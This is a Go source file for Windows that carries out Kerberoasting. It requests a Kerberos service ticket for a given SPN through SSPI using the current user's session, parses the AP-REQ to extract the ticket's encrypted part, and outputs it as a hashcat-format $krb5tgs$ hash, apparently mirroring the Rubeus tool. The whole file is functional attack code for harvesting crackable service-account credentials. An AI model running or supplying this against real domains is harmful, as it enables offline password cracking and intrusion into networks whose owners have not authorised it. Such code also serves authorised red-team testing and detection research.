//go:build windows
// +build windows

package main

import (
	"bytes"
	"encoding/hex"
	"fmt"
	"strings"

	ber "github.com/go-asn1-ber/asn1-ber"
	"github.com/alexbrainman/sspi/kerberos"
)

// krb5 GSS-API mechanism OID (1.2.840.113554.1.2.2) as a DER OID TLV.
var krb5OIDTLV = []byte{0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x12, 0x01, 0x02, 0x02}

// getTGSRepHash requests a service ticket for spn using the current logon
// session (Windows SSPI / Kerberos), extracts the encrypted ticket part from
// the resulting AP-REQ, and formats it as a crackable $krb5tgs$ hash.
//
// This is the Go equivalent of Rubeus' GetTGSRepHash using
// System.IdentityModel.Tokens.KerberosRequestorSecurityToken.
func getTGSRepHash(spn, userName, realm string) (string, error) {
	apReq, err := requestAPReq(spn)
	if err != nil {
		return "", err
	}

	etype, cipher, err := extractTicketEncPart(apReq)
	if err != nil {
		return "", fmt.Errorf("parsing AP-REQ for %s: %w", spn, err)
	}

	return formatHash(etype, cipher, userName, realm, spn), nil
}

// requestAPReq drives Windows SSPI to produce a Kerberos AP-REQ for the SPN and
// returns the raw AP-REQ bytes (GSS-API framing stripped).
func requestAPReq(spn string) ([]byte, error) {
	cred, err := kerberos.AcquireCurrentUserCredentials()
	if err != nil {
		return nil, fmt.Errorf("acquiring current user credentials: %w", err)
	}
	defer cred.Release()

	ctx, _, token, err := kerberos.NewClientContext(cred, spn)
	if err != nil {
		return nil, fmt.Errorf("requesting service ticket for %q: %w", spn, err)
	}
	defer ctx.Release()

	return stripGSSAPIHeader(token)
}

// stripGSSAPIHeader removes the GSS-API InitialContextToken framing
// (0x60 <len> <krb5 OID> <tok-id 0x01 0x00>) and returns the inner AP-REQ.
func stripGSSAPIHeader(token []byte) ([]byte, error) {
	idx := bytes.Index(token, krb5OIDTLV)
	if idx < 0 {
		return nil, fmt.Errorf("GSS-API token does not contain the krb5 mechanism OID")
	}
	// After the OID comes the 2-byte token id; 0x01 0x00 == KRB_AP_REQ.
	start := idx + len(krb5OIDTLV)
	if start+2 > len(token) {
		return nil, fmt.Errorf("GSS-API token truncated after mechanism OID")
	}
	if token[start] != 0x01 || token[start+1] != 0x00 {
		return nil, fmt.Errorf("inner GSS-API token is not an AP-REQ (tok-id %02x %02x)", token[start], token[start+1])
	}
	return token[start+2:], nil
}

// extractTicketEncPart walks the AP-REQ ASN.1 tree to pull the service
// ticket's encryption type and encrypted blob:
//
//	AP-REQ [APPLICATION 14] SEQUENCE { ... ticket [3] Ticket ... }
//	Ticket [APPLICATION 1] SEQUENCE { ... enc-part [3] EncryptedData }
//	EncryptedData SEQUENCE { etype [0] Int32, kvno [1] UInt32 OPT, cipher [2] OCTET STRING }
func extractTicketEncPart(apReq []byte) (etype int, cipher []byte, err error) {
	pkt, err := ber.DecodePacketErr(apReq)
	if err != nil {
		return 0, nil, fmt.Errorf("decoding AP-REQ: %w", err)
	}

	apReqSeq := child0(pkt) // inner SEQUENCE of the AP-REQ
	if apReqSeq == nil {
		return 0, nil, fmt.Errorf("malformed AP-REQ: missing body sequence")
	}

	ticketField := findByTag(apReqSeq, 3) // ticket [3]
	if ticketField == nil {
		return 0, nil, fmt.Errorf("AP-REQ has no ticket field")
	}
	ticketApp := child0(ticketField) // Ticket [APPLICATION 1]
	ticketSeq := child0(ticketApp)   // Ticket SEQUENCE
	if ticketSeq == nil {
		return 0, nil, fmt.Errorf("malformed ticket structure")
	}

	encPartField := findByTag(ticketSeq, 3) // enc-part [3]
	if encPartField == nil {
		return 0, nil, fmt.Errorf("ticket has no enc-part")
	}
	encData := child0(encPartField) // EncryptedData SEQUENCE
	if encData == nil {
		return 0, nil, fmt.Errorf("malformed EncryptedData")
	}

	etypeField := findByTag(encData, 0) // etype [0]
	cipherField := findByTag(encData, 2) // cipher [2]
	if etypeField == nil || cipherField == nil {
		return 0, nil, fmt.Errorf("EncryptedData missing etype or cipher")
	}

	etype = decodeInt(child0(etypeField))
	cipher = child0(cipherField).ByteValue
	if len(cipher) == 0 {
		return 0, nil, fmt.Errorf("empty cipher in service ticket")
	}
	return etype, cipher, nil
}

// formatHash builds the hashcat-format $krb5tgs$ hash, matching Rubeus output.
func formatHash(etype int, cipher []byte, userName, realm, spn string) string {
	h := hex.EncodeToString(cipher)
	realm = strings.ToUpper(realm)

	switch etype {
	case 17, 18: // AES128 / AES256: 12-byte (24 hex) checksum lives at the end.
		split := len(h) - 24
		return fmt.Sprintf("$krb5tgs$%d$%s$%s$*%s*$%s$%s",
			etype, userName, realm, spn, h[split:], h[:split])
	default: // RC4-HMAC (etype 23) and others: 16-byte (32 hex) checksum is first.
		return fmt.Sprintf("$krb5tgs$%d$*%s$%s$%s*$%s$%s",
			etype, userName, realm, spn, h[:32], h[32:])
	}
}

// --- small BER tree helpers -------------------------------------------------

// child0 returns the first child of a packet, or nil.
func child0(p *ber.Packet) *ber.Packet {
	if p == nil || len(p.Children) == 0 {
		return nil
	}
	return p.Children[0]
}

// findByTag returns the first child whose tag number matches, or nil.
func findByTag(p *ber.Packet, tag ber.Tag) *ber.Packet {
	if p == nil {
		return nil
	}
	for _, c := range p.Children {
		if c.Tag == tag {
			return c
		}
	}
	return nil
}

// decodeInt reads a big-endian signed integer from a primitive INTEGER packet.
func decodeInt(p *ber.Packet) int {
	if p == nil {
		return 0
	}
	var v int
	for _, b := range p.ByteValue {
		v = v<<8 | int(b)
	}
	return v
}
